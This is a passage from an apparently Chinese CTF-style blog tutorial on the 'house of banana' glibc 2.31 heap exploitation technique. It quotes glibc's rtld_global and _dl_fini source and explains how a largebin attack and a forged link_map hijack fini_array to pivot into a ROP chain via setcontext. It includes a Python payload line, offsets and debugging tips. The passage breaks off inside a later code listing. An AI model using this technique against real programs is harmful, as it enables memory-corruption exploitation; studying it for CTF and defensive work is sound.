dynamic loader.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> _<span class="title">dl_rtld_auditstate</span>[<span class="title">DL_NNS</span>];</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined SHARED &amp;&amp; defined _LIBC_REENTRANT \</span></span><br><span class="line"><span class="meta">    &amp;&amp; defined __rtld_lock_default_lock_recursive</span></span><br><span class="line">  EXTERN <span class="title function_">void</span> <span class="params">(*_dl_rtld_lock_recursive)</span> <span class="params">(<span class="type">void</span> *)</span>;</span><br><span class="line">  EXTERN <span class="title function_">void</span> <span class="params">(*_dl_rtld_unlock_recursive)</span> <span class="params">(<span class="type">void</span> *)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Get architecture specific definitions.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCINFO_DECL</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PROCINFO_CLASS</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PROCINFO_CLASS EXTERN</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dl-procruntime.c&gt;</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If loading a shared object requires that we make the stack executable</span></span><br><span class="line"><span class="comment">     when it was not, we do it by calling this function.</span></span><br><span class="line"><span class="comment">     It returns an errno code or zero on success.  */</span></span><br><span class="line">  EXTERN <span class="title function_">int</span> <span class="params">(*_dl_make_stack_executable_hook)</span> <span class="params">(<span class="type">void</span> **)</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Prevailing state of the stack, PF_X indicating it&#x27;s executable.  */</span></span><br><span class="line">  EXTERN <span class="title function_">ElfW</span><span class="params">(Word)</span> _dl_stack_flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag signalling whether there are gaps in the module ID allocation.  */</span></span><br><span class="line">  EXTERN <span class="type">bool</span> _dl_tls_dtv_gaps;</span><br><span class="line">  <span class="comment">/* Highest dtv index currently needed.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_tls_max_dtv_idx;</span><br><span class="line">  <span class="comment">/* Information about the dtv slots.  */</span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">dtv_slotinfo_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dtv_slotinfo_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dtv_slotinfo</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">size_t</span> gen;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">    &#125; slotinfo[];</span><br><span class="line">  &#125; *_dl_tls_dtv_slotinfo_list;</span><br><span class="line">  <span class="comment">/* Number of modules in the static TLS block.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_tls_static_nelem;</span><br><span class="line">  <span class="comment">/* Size of the static TLS block.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_tls_static_size;</span><br><span class="line">  <span class="comment">/* Size actually allocated in the static TLS block.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_tls_static_used;</span><br><span class="line">  <span class="comment">/* Alignment requirement of the static TLS block.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_tls_static_align;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Number of additional entries in the slotinfo array of each slotinfo</span></span><br><span class="line"><span class="comment">   list element.  A large number makes it almost certain take we never</span></span><br><span class="line"><span class="comment">   have to iterate beyond the first element in the slotinfo list.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TLS_SLOTINFO_SURPLUS (62)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Number of additional slots in the dtv allocated.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DTV_SURPLUS(14)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initial dtv of the main thread, not allocated with normal malloc.  */</span></span><br><span class="line">  EXTERN <span class="type">void</span> *_dl_initial_dtv;</span><br><span class="line">  <span class="comment">/* Generation counter for the dtv.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_tls_generation;</span><br><span class="line"></span><br><span class="line">  EXTERN <span class="title function_">void</span> <span class="params">(*_dl_init_static_tls)</span> <span class="params">(<span class="keyword">struct</span> link_map *)</span>;</span><br><span class="line"></span><br><span class="line">  EXTERN <span class="title function_">void</span> <span class="params">(*_dl_wait_lookup_done)</span> <span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Scopes to free after next THREAD_GSCOPE_WAIT ().  */</span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">dl_scope_free_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line">    <span class="type">void</span> *<span class="built_in">list</span>[<span class="number">50</span>];</span><br><span class="line">  &#125; *_dl_scope_free_list;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !THREAD_GSCOPE_IN_TCB</span></span><br><span class="line">  EXTERN <span class="type">int</span> _dl_thread_gscope_count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_global_attribute__</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">ifdef</span> HAVE_SDATA_SECTION</span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> __rtld_local_attribute__ \</span></span><br><span class="line"><span class="meta">    __attribute__ ((visibility (<span class="string">&quot;hidden&quot;</span>), section (<span class="string">&quot;.sdata&quot;</span>)))</span></span><br><span class="line"><span class="meta">#   <span class="keyword">undef</span> __rtld_global_attribute__</span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> __rtld_global_attribute__ __attribute__ ((section (<span class="string">&quot;.sdata&quot;</span>)))</span></span><br><span class="line"><span class="meta">#  <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> __rtld_local_attribute__ __attribute__ ((visibility (<span class="string">&quot;hidden&quot;</span>)))</span></span><br><span class="line"><span class="meta">#  <span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_local</span> __<span class="title">rtld_local_attribute__</span>;</span></span><br><span class="line"><span class="meta">#  <span class="keyword">undef</span> __rtld_local_attribute__</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> __<span class="title">rtld_global_attribute__</span>;</span></span><br><span class="line"><span class="meta"># <span class="keyword">undef</span> __rtld_global_attribute__</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>  这里多提一嘴，<strong>_rtld_global</strong>的<strong>_dl_rtld_lock_recursive</strong>和<strong>_dl_rtld_unlock_recursive</strong>字段可以理解为<strong>exit</strong>的hook。<br>  说回正题，可以看到，<strong>rtld_global</strong>中包含<strong>_dl_ns</strong>数组，与elf文件的各个段的符号相关，其中也自然包括了<strong>fini_array</strong>段，而<strong>fini_array</strong>在<strong>_dl_fini</strong>中被调用，相关源代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Lots of fun ahead.  We have to call the destructors for all still</span></span><br><span class="line"><span class="comment">     loaded objects, in all namespaces.  The problem is that the ELF</span></span><br><span class="line"><span class="comment">     specification now demands that dependencies between the modules</span></span><br><span class="line"><span class="comment">     are taken into account.  I.e., the destructor for a module is</span></span><br><span class="line"><span class="comment">     called before the ones for any of its dependencies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To make things more complicated, we cannot simply use the reverse</span></span><br><span class="line"><span class="comment">     order of the constructors.  Since the user might have loaded objects</span></span><br><span class="line"><span class="comment">     using `dlopen&#x27; there are possibly several other modules with its</span></span><br><span class="line"><span class="comment">     dependencies to be taken into account.  Therefore we have to start</span></span><br><span class="line"><span class="comment">     determining the order of the modules once again from the beginning.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We run the destructors of the main namespaces last.  As for the</span></span><br><span class="line"><span class="comment">     other namespaces, we pick run the destructors in them in reverse</span></span><br><span class="line"><span class="comment">     order of the namespace ID.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment"> auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">     copy the pointers in.  */</span></span><br><span class="line">  <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">      &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line">  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">     binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">     the main namespace.  */</span></span><br><span class="line">  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line"> <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">     lock.  */</span></span><br><span class="line">  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">     the front.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">      || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">DL_CALL_DT_FINI</span><br><span class="line">  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!do_audit &amp;&amp; __builtin_expect (GLRO(dl_naudit) &gt; <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">audit_ifaces</span> *<span class="title">afct</span> =</span> GLRO(dl_audit);</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> cnt = <span class="number">0</span>; cnt &lt; GLRO(dl_naudit); ++cnt)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (afct-&gt;objclose != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> *<span class="title">state</span></span></span><br><span class="line"><span class="class">=</span> link_map_audit_state (l, cnt);</span><br><span class="line">      <span class="comment">/* Return value is ignored.  */</span></span><br><span class="line">      (<span class="type">void</span>) afct-&gt;objclose (&amp;state-&gt;cookie);</span><br><span class="line">    &#125;</span><br><span class="line">  afct = afct-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">      --l-&gt;l_direct_opencount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (! do_audit &amp;&amp; GLRO(dl_naudit) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      do_audit = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> again;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">      <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">      <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">      GL(dl_num_relocations),</span><br><span class="line">      GL(dl_num_cache_relocations));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  根据<strong>_dl_fini</strong>逻辑，我们可以发现，<strong>_dl_ns</strong>数组元素的每一个<strong>_ns_loaded</strong>字段都是<strong>link_map</strong>类型的。而对于<strong>link_map</strong>类型的变量<strong>l</strong>，其<strong>l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</strong>是一个元素个数为<strong>l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / sizeof (ElfW(Addr))</strong>的<strong>fini_array</strong>函数指针数组。<br>  因此，只要我们可以修改任意一个<strong>_dl_ns</strong>数组元素的<strong>_ns_loaded</strong>字段的<strong>l_addr</strong>、<strong>l_info</strong>字段的值，即可劫持执行流</p><p>  另一方面，<strong>glibc2.31</strong>下一般<strong>one_gadget</strong>都不太行，其约束条件过多。因此一般通过<strong>setcontext</strong>函数，从而转移栈结构，执行提前构造好的rop。而在<strong>_dl_fini</strong>函数中，当其执行<strong>fini_array</strong>函数指针数组中的倒数第二个函数指针时，其<strong>rdx</strong>的值恰好为fini_array数组最后一个元素的地址，也就是通过<strong>setcontext</strong>函数转移的目标栈恰好位于我们可以控制的内存区域，则可以完成rop的执行。</p><h3 id="攻击姿势"><a href="#攻击姿势" class="headerlink" title="攻击姿势"></a>攻击姿势</h3><p>  在给出最终的攻击姿势之前，需要特别提醒几点</p><ol><li>虽然<strong>_rtld_global</strong>与<strong>glibc</strong>的基址是固定偏移，但是不同机器上该偏移可能低第二个字节不一样(开启gdb和未开启gdb可能也不一样)。因此gdb调通后，只需要爆破第二个字节即可</li><li>在glibc2.31后，<strong>setcontext</strong>函数的转移寄存器更改为了<strong>rdx</strong>。如果不同glibc版本可能不一样</li><li>下面给出的相关偏移都是在glibc2.31下的，不同版本的偏移(比如调用<strong>fini_array</strong>时rdx的相对偏移等)需要具体去更改</li><li><strong>house of banana</strong>的一定需要程序正常退出main；或者显式调用<strong>exit(即其会调用__run_exit_handlers;不能是包装_exit的exit)</strong>退出。如果因为异常退出，则不会执行<strong>fini_array</strong>中的函数指针数组</li><li>在glibc2.31条件下，通过gdb调试时，可以设置<strong>break *(ld_base + 0x11f58)</strong>，查看调用<strong>fini_array</strong></li></ol><p>  首先，我们需要使用<strong>largebin attack</strong>，从而将一个堆地址覆盖到<strong>`_rtld_global-&gt;_dl_ns[0]-&gt;_ns_loaded</strong>，只需要将一个处于<strong>largebin</strong>的chunk的前<strong>SIZE_SZ * 6</strong>覆盖成如下值即可<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">up64(pre_size) + up64(size | <span class="number">1</span>) + up64(fd) + up64(bk) + up64(fd_nextsize) + up64(_rtld_global - <span class="number">0x20</span>)</span><br></pre></td></tr></table></figure><br>  然后在释放一个chunk大小小于<strong>size</strong>的、但和chunk处于同一个<strong>largebin</strong>的<strong>fake_link_map</strong>到<strong>largebin</strong>中，则成功将覆盖了<strong>_rtld_global-&gt;_dl_ns[0]-&gt;_ns_loaded</strong>的指针值</p><p>  下面则是伪造<strong>link_map</strong>结构，从而劫持<strong>fini_array</strong>即可，相关的源代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span 